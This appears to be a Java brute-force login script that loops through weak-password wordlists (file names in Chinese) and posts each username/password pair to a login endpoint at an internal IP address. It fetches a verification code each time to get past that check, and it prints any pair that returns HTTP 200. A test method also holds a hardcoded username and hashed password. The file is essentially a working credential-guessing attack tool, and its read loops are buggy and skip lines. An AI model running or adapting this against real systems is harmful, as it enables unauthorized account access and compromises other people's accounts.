package com.inspur.auto;

import com.alibaba.fastjson.JSONObject;
import frm.util.HttpClient;
import frm.util.HttpClientUtil;
import org.apache.commons.codec.digest.DigestUtils;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.junit.Test;

import java.io.*;
import java.util.HashMap;
import java.util.Map;

public class AtrackLogin {
    public static void main(String[] args) {
        File file = new File("D:\\安全资料\\工具\\路径&字典\\login\\弱口令.txt");
        File filePWD = new File("D:\\安全资料\\工具\\路径&字典\\login\\密码1.txt");
        FileInputStream fileInputStream = null;
        FileInputStream fileInputStreamPWD = null;
        InputStreamReader inputStreamReader = null;
        InputStreamReader inputStreamReaderPWD = null;
        BufferedReader bufferedReader = null;
        BufferedReader bufferedReaderPWD = null;
        try {
            fileInputStream = new FileInputStream(file);
            fileInputStreamPWD = new FileInputStream(filePWD);
            inputStreamReader = new InputStreamReader(fileInputStream);
            inputStreamReaderPWD = new InputStreamReader(fileInputStreamPWD);
            bufferedReader = new BufferedReader(inputStreamReader);
            bufferedReaderPWD = new BufferedReader(inputStreamReaderPWD);
            String username = null;
            String password = null;
            while ((bufferedReader.readLine())!=null){
                username = bufferedReader.readLine();
                while ((bufferedReaderPWD.readLine())!=null){
                    password = bufferedReaderPWD.readLine();
                    String rdmCodeResult = HttpClient.get("http://10.1.80.242/v6/rdmCode");
                    Map parseMap = (Map)JSONObject.parse(rdmCodeResult);
                    String rdmCode = (String) parseMap.get("code");
                    Map<String,String> paraMap = new HashMap<>();
                    paraMap.put("j_username",username);
                    paraMap.put("j_password",password);
                    paraMap.put("rdmCode",rdmCode);
                    CloseableHttpResponse closeableHttpResponse = HttpClientUtil.doPost("http://10.1.80.242/v6/j_bsp_security_check/", paraMap);
                    if (200==closeableHttpResponse.getStatusLine().getStatusCode()){
                        System.out.println("UserName：---------------"+username +"password---------------------"+password);
                    }
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    @Test
    public void getRdmCode(){
        String rdmCodeResult = HttpClient.get("http://10.1.80.242/v6/rdmCode");
        Map parseMap = (Map)JSONObject.parse(rdmCodeResult);
        String rdmCode = (String) parseMap.get("code");
    }
    @Test
    public void doLogin(){
        Map<String,String> paraMap = new HashMap<>();
        paraMap.put("j_username","b123456789");
        paraMap.put("j_password","14f4791f5a91c776251107f6ab0b25c9");
        paraMap.put("rdmCode","GOU5");
        CloseableHttpResponse closeableHttpResponse = HttpClientUtil.doPost("http://10.1.80.242/v6/j_bsp_security_check/", paraMap);
        if (200==closeableHttpResponse.getStatusLine().getStatusCode()){
            System.out.println("执行结果为：成功");
        }else {
            System.out.println("执行结果为"+closeableHttpResponse.getStatusLine().getStatusCode());
        }

    }
}
